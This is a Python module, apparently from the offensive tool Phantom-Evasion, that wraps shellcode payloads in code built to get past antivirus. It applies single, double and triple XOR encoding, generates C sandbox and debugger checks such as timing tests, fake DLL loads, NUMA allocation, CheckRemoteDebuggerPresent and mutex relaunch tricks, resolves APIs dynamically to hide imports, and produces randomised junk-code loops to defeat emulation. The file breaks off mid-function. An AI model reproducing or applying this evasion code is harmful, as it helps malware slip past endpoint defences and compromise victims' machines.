
     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #   along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.           #
     #                                                                                      #
     ########################################################################################


import random, string
import sys
import platform 
sys.path.append("Modules/payloads/encryption")
import Multibyte_xor
import Multibyte_xorPy3
sys.dont_write_bytecode = True

def encoding_manager(Encryption,Payload,Randbufname):

    if Encryption == "1":

        Payload = Payload.replace("buf",Randbufname)

        return Payload

    if (Encryption == "2") or (Encryption == "3") or (Encryption == "4"):

        Payload = Payload.splitlines()
        Shellcode = ""
        for line in Payload:
            line=line.replace("unsigned char buf[]","")
            line=line.replace(" ","")
            line=line.replace("=","")
            line=line.replace('"','')
            line=line.replace('\n','')
            line=line.replace(';','')
            Shellcode += line

        py_version=platform.python_version()
        if py_version[0] == "3":

            if Encryption == "2":

                Payload = Multibyte_xorPy3.Xor_stub3(Shellcode,Randbufname)

                return Payload

            if Encryption == "3": 

                Payload = Multibyte_xorPy3.Doublexor_stub3(Shellcode,Randbufname) 
 
                return Payload

            if Encryption == "4": 

                Payload = Multibyte_xorPy3.Triplexor_stub3(Shellcode,Randbufname) 
 
                return Payload

        else:

            if Encryption == "2":

                Payload = Multibyte_xor.Xor_stub2(Shellcode,Randbufname)

                return Payload

            if Encryption == "3": 

                Payload = Multibyte_xor.Doublexor_stub2(Shellcode,Randbufname) 
 
                return Payload

            if Encryption == "4": 

                Payload = Multibyte_xor.Triplexor_stub2(Shellcode,Randbufname) 
 
                return Payload



def powershell_adjust(powershell_var):
    ret_powershell=""
    powershell_var=powershell_var.splitlines()
    for line in powershell_var:
        if line != "\n" and line != "":
            line= '"' + line.replace('"','\\"') + '\\n"\n'
            ret_powershell += line
    return ret_powershell

def windows_evasion(number):
    Evasion_code = ""
    if number == "1":    # open process trick
        Randfilehandle = varname_creator()
        Randprochandle = varname_creator()
        Evasion_code += "HANDLE " + Randprochandle + ";\n"
        Evasion_code += Randprochandle + " = OpenProcess( PROCESS_ALL_ACCESS, FALSE,4);\n"
        Evasion_code += "if(" + Randprochandle + " == NULL){\n"

    elif number == "2":  # check time distortion 1
        Randtime1 = varname_creator()
        Randtime2 = varname_creator()
        dyn_loadGTC = varname_creator()
        Randsleep = random.randint(500,1000)
        Randsleepcheck = str(Randsleep - 50)
        Randsleep = str(Randsleep)
        Evasion_code += "DWORD " + Randtime1 + ";\n"
        Evasion_code += "DWORD " + Randtime2 + ";\n"
        Evasion_code += "FARPROC " + dyn_loadGTC + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"GetTickCount\");\n"
        Evasion_code += Randtime1 + " = (DWORD)" + dyn_loadGTC + "();\n"
        Evasion_code += "Sleep(" + Randsleep + ");\n"
        Evasion_code += Randtime2 + " = (DWORD)" + dyn_loadGTC + "();\n"
        Evasion_code += "if ((" + Randtime2 + " - " + Randtime1 + ") > " + Randsleepcheck + "){\n"

    elif number == "3":  # Create file Set attribute_hidden and remove it 
        Randvarname = varname_creator()
        junk = varname_creator()
        Randfileptr = varname_creator()
        Randfilename = varname_creator()
        Randattr = varname_creator()        
        Evasion_code += "char " + Randvarname + "[] = " + "\"" + junk + "\";\n" 
        Evasion_code += "FILE *" + Randfileptr + " = fopen(\"" + Randfilename + "\",\"w\");\n"
        Evasion_code += "fputs(" + Randvarname + "," + Randfileptr + ");\n"
        Evasion_code += "fclose(" + Randfileptr + ");\n"
        Evasion_code += "DWORD " + Randattr + " = GetFileAttributes(\"" + Randfilename + "\");\n"
        Evasion_code += "SetFileAttributes(\"" + Randfilename + "\"," + Randattr + " + FILE_ATTRIBUTE_HIDDEN);\n"
        Evasion_code += "if ((" + Randfileptr + " = fopen(\"" + Randfilename + "\", \"r\"))){\n"
        Evasion_code += "fclose(" + Randfileptr + ");\n"
        Evasion_code += "remove(\"" + Randfilename + "\");\n"


    elif number == "4": # dynamic big mem alloc then zero-out
        Ndcvirtual = varname_creator()
        Randptr = varname_creator()
        Randbytesnumb = str(random.randrange(10000000,90000000,1024))
        
        Evasion_code += "LPVOID " + Randptr + " = NULL ;\n"
        Evasion_code += "FARPROC " + Ndcvirtual + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"VirtualAlloc\");\n"
        Evasion_code += Randptr + " = (LPVOID)" + Ndcvirtual + "(NULL," + Randbytesnumb + ",0x3000,0x40);\n"
        Evasion_code += "if(" + Randptr + "!= NULL){\n"
        Evasion_code += "SecureZeroMemory(" + Randptr + "," + Randbytesnumb + ");\n"
        Evasion_code += "VirtualFree(" + Randptr + ", 0 , 0x8000);\n"


    elif number == "5": # load fake dll

        Ker32 = varname_creator()
        Fakedllname = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(random.randint(12,16)))
        
        Evasion_code += "HINSTANCE " + Ker32 + " = LoadLibrary(TEXT(\"" + Fakedllname + ".dll\"));\n"
        Evasion_code += "if(" + Ker32 + " == NULL){\n"


    elif number == "6": # SetErrorMode trick

        dwCode = varname_creator()
        error_numb = str(random.randint(1000,2000))
        
        Evasion_code += "DWORD " + dwCode + ";\n"
        Evasion_code += "SetErrorMode(" + error_numb + ");\n"
        Evasion_code += "if(SetErrorMode(0) == " + error_numb + "){\n"

    if number == "7": # dynamic open process trick
        dyn_loadOP = varname_creator()
        Randprochandle = varname_creator()

        Evasion_code += "HANDLE " + Randprochandle + ";\n"
        Evasion_code += "FARPROC " + dyn_loadOP + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"OpenProcess\");\n"
        Evasion_code += Randprochandle + " = (HANDLE)" + dyn_loadOP + "( PROCESS_ALL_ACCESS, FALSE,4);\n"
        Evasion_code += "if(" + Randprochandle + " == NULL){\n"

    elif number == "8": # dynamic WTF is numa?
        dyn_loadVAEX = varname_creator()
        memvar = varname_creator()
        
        Evasion_code += "LPVOID " + memvar + " = NULL;\n"
        Evasion_code += "FARPROC " + dyn_loadVAEX + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"VirtualAllocExNuma\");\n"
        Evasion_code += memvar + " = (LPVOID)" + dyn_loadVAEX + "(GetCurrentProcess(),NULL," + str(random.randint(600,1200)) + ",0x00001000|0x00002000,0x40,0);\n"
        Evasion_code += "if(" + memvar + " != NULL){\n"


    elif number == "9": # dynamic WTF is fls?
        dyn_loadFLSA = varname_creator()
        resvar = varname_creator()
        

        Evasion_code += "FARPROC " + dyn_loadFLSA + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"FlsAlloc\");\n"
        Evasion_code += "DWORD " + resvar + " = (DWORD)" + dyn_loadFLSA + "(NULL);\n"
        Evasion_code += "if(" + resvar + " != FLS_OUT_OF_INDEXES){\n"
 
    elif number == "10": # LoadLibrary ntoskrnl.exe

        procvar = varname_creator()        
        Evasion_code += "HINSTANCE " + procvar + " = LoadLibrary(TEXT(\"ntoskrnl.exe\"));\n"
        Evasion_code += "if(" + procvar + " != NULL){\n"

    elif number == "11": # Dynamic CheckRemoteDebuggerPresent

        dyn_loadCRDP = varname_creator()
        Randbool = varname_creator()
        Evasion_code += "BOOL " + Randbool + " = FALSE;\n"
        Evasion_code += "FARPROC " + dyn_loadCRDP + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"CheckRemoteDebuggerPresent\");\n"
        Evasion_code += dyn_loadCRDP + "(GetCurrentProcess(), &" + Randbool + ");\n"
        Evasion_code += "if(" + Randbool + " != TRUE){\n"

    elif number == "12": # Dynamic2 WTF is numa?
        dyn_loadVAEX = varname_creator()
        Ker32 = varname_creator()
        memvar = varname_creator()
        
        Evasion_code += "LPVOID " + memvar + " = NULL;\n"
        Evasion_code += "HINSTANCE " + Ker32 + " = LoadLibrary(\"kernel32.dll\");\n"
        Evasion_code += "if(" + Ker32 + " != NULL){\n"
        Evasion_code += "FARPROC " + dyn_loadVAEX + " = GetProcAddress(" + Ker32 + ", \"VirtualAllocExNuma\");\n"
        Evasion_code += memvar + " = (LPVOID)" + dyn_loadVAEX + "(GetCurrentProcess(),NULL," + str(random.randint(600,1200)) + ",0x00001000|0x00002000,0x40,0);}\n"
        Evasion_code += "if(" + memvar + " != NULL){\n"


    elif number == "13": # CreateMutex Tricks 1

        mutexvar = varname_creator()
        mutexname = varname_creator()
        Randtime = str(random.randint(40000,80000)) 
        Evasion_code += "HANDLE " + mutexvar + ";\n"
        Evasion_code += "CreateMutex(NULL, TRUE,\"" + mutexname + "\");\n"
        Evasion_code += "if(GetLastError() != ERROR_ALREADY_EXISTS){"
        Evasion_code += "WinExec(argv[0],0);Sleep(" + Randtime + ");}\n"
        Evasion_code += "if(GetLastError() == ERROR_ALREADY_EXISTS){\n"


    elif number == "14": # CreateMutex Tricks 2

        mutexvar = varname_creator()
        mutexname = varname_creator()
        dyn_loadWE = varname_creator()
        Randtime = str(random.randint(40000,80000)) 
        Evasion_code += "HANDLE " + mutexvar + ";\n"
        Evasion_code += "CreateMutex(NULL, TRUE,\"" + mutexname + "\");\n"
        Evasion_code += "if(GetLastError() != ERROR_ALREADY_EXISTS){"
        Evasion_code += "FARPROC " + dyn_loadWE + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"WinExec\");\n" 
        Evasion_code += dyn_loadWE + "(argv[0],0);Sleep(" + Randtime + ");}\n"
        Evasion_code += "if(GetLastError() == ERROR_ALREADY_EXISTS){\n"

    elif number == "15": # dyn check time distortion 2 
        Randtime1 = varname_creator()
        Randtime2 = varname_creator()
        Rand_delayms = varname_creator()
        dyn_loadGTC = varname_creator()
        dyn_loadSE = varname_creator()
        Randsleep = random.randint(500,1000)
        Randsleepcheck = str(Randsleep - 50)
        Randsleep = str(Randsleep)
        Evasion_code += "DWORD " + Randtime1 + ";\n"
        Evasion_code += "const DWORD " + Rand_delayms + " = " + Randsleep + ";\n"
        Evasion_code += "FARPROC " + dyn_loadSE + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"SleepEx\");\n" 
        Evasion_code += "DWORD " + Randtime2 + ";\n"
        Evasion_code += "FARPROC " + dyn_loadGTC + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"GetTickCount\");\n"
        Evasion_code += Randtime1 + " = (DWORD)" + dyn_loadGTC + "();\n"
        Evasion_code += dyn_loadSE + "(" + Rand_delayms + ",FALSE);\n"
        Evasion_code += Randtime2 + " = (DWORD)" + dyn_loadGTC + "();\n"
        Evasion_code += "if ((" + Randtime2 + " - " + Randtime1 + ") > " + Randsleepcheck + "){\n"

    elif number == "16": # dynamic2 WTF is fls?
        dyn_loadFLSA = varname_creator()
        Ker32 = varname_creator()
        resvar = varname_creator()
        
        Evasion_code += "HINSTANCE " + Ker32 + " = LoadLibrary(\"kernel32.dll\");\n"
        Evasion_code += "DWORD " + resvar + ";\n"
        Evasion_code += "if(" + Ker32 + " != NULL){\n"
        Evasion_code += "FARPROC " + dyn_loadFLSA + " = GetProcAddress(" + Ker32 + ", \"FlsAlloc\");\n"
        Evasion_code += resvar + " = (DWORD)" + dyn_loadFLSA + "(NULL);}\n"
        Evasion_code += "if(" + resvar + " != FLS_OUT_OF_INDEXES){\n"


    elif number == "17": # dyn check time distortion 1 
        Randtime1 = varname_creator()
        Randtime2 = varname_creator()
        dyn_loadGTC = varname_creator()
        Rand_delayms = varname_creator()
        Randsleep = random.randint(500,1000)
        Randsleepcheck = str(Randsleep - 50)
        Randsleep = str(Randsleep)
        Evasion_code += "DWORD " + Randtime1 + ";\n"
        Evasion_code += "DWORD " + Randtime2 + ";\n"
        Evasion_code += "const DWORD " + Rand_delayms + " = " + Randsleep + ";\n"
        Evasion_code += "FARPROC " + dyn_loadGTC + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"GetTickCount\");\n"
        Evasion_code += Randtime1 + " = (DWORD)" + dyn_loadGTC + "();\n"
        Evasion_code += "SleepEx(" + Rand_delayms + ",FALSE);\n"
        Evasion_code += Randtime2 + " = (DWORD)" + dyn_loadGTC + "();\n"
        Evasion_code += "if ((" + Randtime2 + " - " + Randtime1 + ") > " + Randsleepcheck + "){\n"


    return Evasion_code

def windows_junkcode(number):
    Winjunk_code = ""

    if number == "1":

        msgtype= MBtype()

        Winjunk_code += "MessageBox(NULL,\"Failed\",NULL," + msgtype + ");\n"

    if number == "2":
        User32 = varname_creator()
        dyn_loadMB = varname_creator()
        msgtype= MBtype()

        Winjunk_code += "HINSTANCE " + User32 + " = LoadLibrary(\"User32.dll\");\n"
        Winjunk_code += "if(" + User32 + " != NULL){\n"
        Winjunk_code += "FARPROC " + dyn_loadMB + " = GetProcAddress(" + User32 + ", \"MessageBox\");\n"
        Winjunk_code += dyn_loadMB +"(NULL,\"Failed\",NULL," + msgtype + ");}\n"

    if number == "3":

        dyn_loadMB = varname_creator()
        msgtype= MBtype()

        Winjunk_code += "FARPROC " + dyn_loadMB + " = GetProcAddress(GetModuleHandle(\"User32.dll\"), \"MessageBox\");\n" 
        Winjunk_code += dyn_loadMB +"(NULL,\"Failed\",NULL," + msgtype + ");\n"

    return Winjunk_code


def MBtype():
    msgtype=""
    msgrandomtype = random.randint(1,3)
    if msgrandomtype == 1:
        msgtype="MB_ABORTRETRYIGNORE"
    if msgrandomtype == 2:
        msgtype="MB_CANCELTRYCONTINUE"
    if msgrandomtype == 3:
        msgtype="MB_OKCANCEL"  
    return msgtype

def python_poly_multipath(number,step):
    num_space = ""
    if step == "1":
        num_space=""
    elif step == "2":
        num_space="    "
    elif step == "3":
        num_space="        "
    elif step == "4":
        num_space="            "
    
    if number == "1":    #Long Counter
        Randcounter = varname_creator()
        Randbig = str(random.randint(100000000,220000000))  
        Hollow_code = ""
        Hollow_code += num_space + Randcounter + " = 0\n"
        Hollow_code += num_space + "while " + Randcounter + " < " + Randbig + ":\n"
        Hollow_code += num_space + "    " + Randcounter + " += 1\n"
        Hollow_code += num_space + "if " + Randcounter + " == " + Randbig + ":\n"
        return Hollow_code 

    elif number == "2":   #BacktoZero

        Randbig1 = str(random.randrange(100000000,220000000,100))
        Randcpt = varname_creator()
        Hollow_code = ""
        Hollow_code += num_space + Randcpt + "  = " + Randbig1 + "\n"
        Hollow_code += num_space + "while  " + Randcpt + " > 0 :\n"
        Hollow_code += num_space + "    " + Randcpt + " = " + Randcpt + " - 1\n"
        Hollow_code += num_space + "if " + Randcpt + " == 0 :\n"
        return Hollow_code 

    elif number == "3": # crazy pow 

        Randvar = varname_creator()
        Randfloat = random.uniform(1.110,1.119)
        Randint = random.randint(100,300)
        Randpow = Randfloat**Randint
        Randpow = str(Randpow)  
        Hollow_code = ""
        Hollow_code += num_space + Randvar + " = " + Randpow + "\n"
        Hollow_code += num_space + "while " + Randvar + " > 1:\n"
        Hollow_code += num_space + "    " + Randvar + " = " + Randvar + "/" + str(Randfloat) + "\n"
        Hollow_code += num_space + "if " + Randvar + " <= 1:\n" 
        return Hollow_code

def Junkmathinject(number):

    if number == "1":#sum firs n integer 
        Randcounter = varname_creator()
        Randcounter2 = varname_creator()
        Randcounter3 = varname_creator()
        Randbignumb = str(random.randint(10000,99000))
        Junkcode = ""
        Junkcode += "int " + Randcounter + "," + Randcounter2 + "," + Randcounter3 + " = 0;\n"
        Junkcode += Randcounter2 + " = " + Randbignumb + ";\n"
        Junkcode += "for (" + Randcounter + " = 1;" + Randcounter + " <= " + Randcounter2 + "; " + Randcounter + "++){\n"
        Junkcode += Randcounter3 + " = " + Randcounter3 + "+" + Randcounter + ";}\n"
        Junkcode += "printf (\"%d\"," + Randcounter3 + ");\n" 

    elif number == "2":#fibonacci numbers in range (1,N)

        Rand1=varname_creator()
        Rand2=varname_creator()
        Rand3=varname_creator()
        Rand4=varname_creator()
        Rand5=varname_creator()
        Randbignumb = str(random.randint(10000,99999))

        Junkcode = ""
        Junkcode += "int " + Rand1 + " = 0," + Rand2 + " = 1," + Rand3 + "," + Rand4 + "," + Rand5 + " = 0;\n"
        Junkcode += Rand4 + " = " + Randbignumb + ";\n"
        Junkcode += "printf(\" %d \"," + Rand4 + ");\n"
        Junkcode += "while (" + Rand5 + " < " + Rand4 + "){\n"
        Junkcode += Rand3 + " = " + Rand1 + " + " + Rand2 + ";\n" + Rand5 + "++;\n"
        Junkcode += "printf(\"%d \"," + Rand3 + ");\n" + Rand1 + "=" + Rand2 + ";\n" + Rand2 + " = " + Rand3 + ";}\n"
 

    elif number == "3":#colossal factorial
        Randn = varname_creator()
        Randbig = str(random.randint(20,60))
        Randii = varname_creator()
        Randfact = varname_creator()

        Junkcode = ""
        Junkcode += "int " + Randn + " = " + Randbig + "," + Randii + ";\n" + "unsigned long long " + Randfact + " = 1;\n"
        Junkcode += "for(" + Randii + "=1; " + Randii + "<=" + Randn + ";" + Randii + "++){\n" + Randfact + " *= " + Randii + ";}\n"
        Junkcode += "printf(\"%llu\"," + Randfact + ");\n"

    elif number == "4": # Twin tower 

        Randbig1 = str(random.randrange(10000000,59000000,10))
        Randbig2 = str(random.randrange(10000000,29000000,10))
        Randcpt= varname_creator()
        Randcpt2= varname_creator()
        Randi = varname_creator()
        Junkcode = ""
        Junkcode += "int " + Randcpt + "  = " + Randbig1 + ";\n"
        Junkcode += "int " + Randcpt2 + " = " + Randbig2 + ";\n"
        Junkcode += "while ( " + Randcpt + " > 0 ){\n"
        Junkcode += "if (" + Randcpt + " > " + Randcpt2 + "){\n"
        Junkcode += Randcpt + " = " + Randcpt + " - 1;}\n"
        Junkcode += "else{\n"
        Junkcode += Randcpt2 + " = " + Randcpt2 + " - 1;}\n"
        Junkcode += "printf(\"%d\"," + Randcpt + ");}\n"

    elif number == "5": #BacktoZero

        Randbig1 = str(random.randrange(100000000,590000000,100))
        Randcpt= varname_creator()
        Junkcode = ""
        Junkcode += "int " + Randcpt + "  = " + Randbig1 + ";\n"
        Junkcode += "while ( " + Randcpt + " > 0 ){\n"
        Junkcode += Randcpt + " = " + Randcpt + " - 1;\n"
        Junkcode += "printf(\"%d\"," + Randcpt + ");}\n"


    elif number == "6": # Randmatrix 1

        Randi = str(random.randint(70,100))
        Randj = str(random.randint(70,100))
        Randmatr= varname_creator()
        Randtot= varname_creator()
        Randflag = varname_creator()
        Randflag2 = varname_creator()
        Junkcode = ""
        Junkcode += "int " + Randflag + "," + Randflag2 + ";\n"
        Junkcode += "int " + Randtot + " = 0;\n"
        Junkcode += "float " + Randmatr + "[" + Randi + "]" + "[" + Randj + "]" + " = {{0}};\n"
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr + "[" + Randflag + "]" + "[" + Randflag2 + "]" + " = rand() % 100;\n}}"
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randtot + " = " + Randtot + " + " + Randmatr + "[" + Randflag + "]" + "[" + Randflag2 + "];\n}}"

    elif number == "7": # Randmatrix 2

        Randi = str(random.randint(50,80))
        Randj = str(random.randint(50,80))
        Randmatr= varname_creator()
        Randmatr2= varname_creator()
        Randmatr3= varname_creator()
        Randtot= varname_creator()
        Randflag = varname_creator()
        Randflag2 = varname_creator()
        Junkcode = ""
        Junkcode += "int " + Randtot + " = 0;\n"
        Junkcode += "int " + Randflag + "," + Randflag2 + ";\n"
        Junkcode += "float " + Randmatr + "[" + Randi + "]" + "[" + Randj + "]" + " = {{0}};\n"
        Junkcode += "float " + Randmatr2 + "[" + Randi + "]" + "[" + Randj + "]" + " = {{0}};\n"
        Junkcode += "float " + Randmatr3 + "[" + Randi + "]" + "[" + Randj + "]" + " = {{0}};\n"
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr + "[" + Randflag + "]" + "[" + Randflag2 + "]" + " = rand() % 100;\n"
        Junkcode += Randmatr2 + "[" + Randflag + "]" + "[" + Randflag2 + "]" + " = rand() % 100;\n}}"
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr3 + "[" + Randflag + "][" + Randflag2 + "] = " + Randmatr + "[" + Randflag + "][" + Randflag2 + "] +" + Randmatr + "[" + Randflag + "][" + Randflag2 + "];\n}}"

    elif number == "8": # Randmatrix 3

        Randi = str(random.randint(100,150))
        Randj = str(random.randint(100,150))
        Randmatr= varname_creator()
        Randmatr2= varname_creator()
        Randmatr3= varname_creator()
        Randtot= varname_creator()
        Randflag = varname_creator()
        Randflag2 = varname_creator()
        Junkcode = ""
        Junkcode += "int " + Randflag + "," + Randflag2 + ";\n"
        Junkcode += "int " + Randtot + " = 0;\n"
        Junkcode += "float " + Randmatr2 + "[" + Randi + "]" + "[" + Randj + "]" + " = {{0}};\n"
        Junkcode += "float " + Randmatr3 + "[" + Randi + "]" + "[" + Randj + "]" + " = {{0}};\n"
        Junkcode += "float " + Randmatr + "[" + Randi + "]" + "[" + Randj + "]" + " = {{0}};\n"
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr + "[" + Randi + "]" + "[" + Randj + "]" + " = rand() % 3000;\n"
        Junkcode += Randmatr2 + "[" + Randi + "]" + "[" + Randj + "]" + " = rand() % 3000;\n}}"
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr3 + "[" + Randflag + "][" + Randflag2 + "] = " + Randmatr + "[" + Randflag + "][" + Randflag2 + "] -" + Randmatr + "[" + Randflag + "][" + Randflag2 + "];\n}}"


    elif number == "9": # Randmatrix 4

        Randi = str(random.randint(100,150))
        Randj = str(random.randint(100,150))
        Randmatr= varname_creator()
        Randmatr2= varname_creator()
        Randmatr3= varname_creator()
        Randtot= varname_creator()
        Randflag = varname_creator()
        Randflag2 = varname_creator()
        Junkcode = ""
        Junkcode += "int " + Randtot + " = 0;\n"
        Junkcode += "int " + Randflag + "," + Randflag2 + ";\n"
        Junkcode += "float " + Randmatr + "[" + Randi + "]" + "[" + Randj + "]" + " = {{0}};\n"
        Junkcode += "float " + Randmatr2 + "[" + Randi + "]" + "[" + Randj + "]" + " = {{0}};\n"
        Junkcode += "float " + Randmatr3 + "[" + Randi + "]" + "[" + Randj + "]" + " = {{0}};\n"
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr + "[" + Randflag + "]" + "[" + Randflag2 + "]" + " = rand() % 50;\n"
        Junkcode += Randmatr2 + "[" + Randflag + "]" + "[" + Randflag2 + "]" + " = rand() % 50;\n}}"
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr3 + "[" + Randflag + "][" + Randflag2 + "] = " + Randmatr + "[" + Randflag + "][" + Randflag2 + "] *" + Randmatr + "[" + Randflag + "][" + Randflag2 + "];\n}}"



    elif number == "10": # Randmatrix 5

        Randi = str(random.randint(80,120))
        Randj = str(random.randint(80,120))
        Randmatr= varname_creator()
        Randmatr2= varname_creator()
        Randmatr3= varname_creator()
        Randtot= varname_creator()
        Randflag = varname_creator()
        Randflag2 = varname_creator()
        Junkcode = ""
        Junkcode += "int " + Randflag + "," + Randflag2 + ";\n"
        Junkcode += "int " + Randtot + " = 0;\n"
        Junkcode += "float " + Randmatr2 + "[" + Randi + "]" + "[" + Randj + "]" + " = {{0}};\n"
        Junkcode += "float " + Randmatr + "[" + Randi + "]" + "[" + Randj + "]" + " = {{0}};\n"
        Junkcode += "float " + Randmatr3 + "[" + Randi + "]" + "[" + Randj + "]" + " = {{0}};\n"
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr + "[" + Randflag + "]" + "[" + Randflag2 + "]" + " = rand() % 50;\n"
        Junkcode += Randmatr2 + "[" + Randflag + "]" + "[" + Randflag2 + "]" + " = rand() % 50;\n}}"
        Junkcode += "for(" + Randflag + "=0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n" 
        Junkcode += "for(" + Randflag2 + "=0;"+ Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr3 + "[" + Randflag + "][" + Randflag2 + "] = " + Randmatr + "[" + Randflag + "][" + Randflag2 + "] /" + Randmatr + "[" + Randflag + "][" + Randflag2 + "];\n}}"

    elif number == "11": # powf counter 

        Randsmall = str(random.uniform(1.300,2.000))
        Randbig = str(random.randrange(1000000,9999000,100))
        Randcpt= varname_creator()
        Randi = varname_creator()
        Junkcode = ""
        Junkcode += "float " + Randcpt + "  = " + Randsmall + ";\n"
        Junkcode += "float " + Randi + " = " + Randsmall + ";\n"
        Junkcode += "while(" + Randcpt + " < " + Randbig + "){\n"
        Junkcode += Randcpt + " = powf(" + Randcpt + "," + Randi + ");}\n"

    elif number == "12": # pow counter 

        Randsmall = str(random.uniform(1.300,3.000))
        Randsmall2 = str(random.uniform(1.300,3.000))
        Randbig = str(random.randrange(100000,500000,100))
        Randcpt= varname_creator()
        Randi = varname_creator()
        Junkcode = ""
        Junkcode += "double " + Randcpt + "  = " + Randsmall + ";\n"
        Junkcode += "double " + Randi + " = " + Randsmall2 + ";\n"
        Junkcode += "while(" + Randcpt + " < " + Randbig + "){\n"
        Junkcode += Randcpt + " = pow(" + Randcpt + "," + Randi + ");}\n"

    elif number == "13": # Junk printer
        Randtext1 = varname_creator() 
        Randtext2 = varname_creator()
        Randtext3 = varname_creator()
        Randflag = varname_creator()
        Randflag2 = varname_creator()
        Randflag3 = varname_creator()
        Junkcode = ""
        Junkcode += "int " + Randflag + "," + Randflag2 + "," + Randflag3 + " = 0;\n"
        Junkcode += "char " + Randtext1 + "[] = \"" + Randtext1 + "\";\n" 
        Junkcode += "char " + Randtext2 + "[] = \"" + Randtext2 + "\";\n"
        Junkcode += "char " + Randtext3 + "[] = \"" + Randtext3 + "\";\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + "++;" + Randflag + " < " + str(random.randint(100,250)) + "){\n"
        Junkcode += "printf(\"" + Randtext1 + "\");\n"
        Junkcode += "for(" + Randflag2 + " = 0;" + Randflag + "++;" + Randflag + " < " + str(random.randint(4,10)) + "){\n"
        Junkcode += "printf(\"" + Randtext2 + "\");\n"
        Junkcode += "for(" + Randflag3 + " = 0;" + Randflag + "++;" + Randflag + " < " + str(random.randint(2,6)) + "){\n"
        Junkcode += "printf(\"" + Randtext3 + "\");\n"
        Junkcode += "printf(\"" + Randtext2 + "\");\n"
        Junkcode += "printf(\"" + Randtext1 + "\");}}}\n"

    elif number == "14": # Junk printer 2

        Randtext1 = varname_creator() 
        Randtext2 = varname_creator()
        Randflag = varname_creator()
        Randflag2 = varname_creator()
        Junkcode = ""
        Junkcode += "int " + Randflag + "," + Randflag2 + " = 0;\n"
        Junkcode += "char " + Randtext1 + "[] = \"" + Randtext1 + "\";\n" 
        Junkcode += "char " + Randtext2 + "[] = \"" + Randtext2 + "\";\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + "++;" + Randflag + " < " + str(random.randint(5,25)) + "){\n"
        Junkcode += "printf(\"" + Randtext1 + "\");\n"
        Junkcode += "for(" + Randflag2 + " = 0;" + Randflag + "++;" + Randflag + " < " + str(random.randint(3,8)) + "){\n"
        Junkcode += "printf(\"" + Randtext2 + "\");\n"
        Junkcode += "printf(\"" + Randtext1 + "\");}}\n"

    elif number == "15": #BacktoNumb

        Randbig1 = str(random.randrange(100000000,200000000,10))
        Randcpt= varname_creator()
        Junkcode = ""
        Junkcode += "int " + Randcpt + "  = " + Randbig1 + ";\n"
        Junkcode += "while ( " + Randcpt + " > " + str(random.randrange(10,99,2)) + " ){\n"
        Junkcode += Randcpt + " = " + Randcpt + " - 1;\n"
        Junkcode += "printf(\"%d\"," + Randcpt + ");}\n"

    elif number == "16": # double-Twin tower 

        Randbig1 = str(random.randrange(10000000,20000000,10))
        Randbig2 = str(random.randrange(10000000,15000000,10))
        Randbig3 = str(random.randrange(10000000,13000000,10))
        Randbig4 = str(random.randrange(1000000,1100000,10))
        Randcpt= varname_creator()
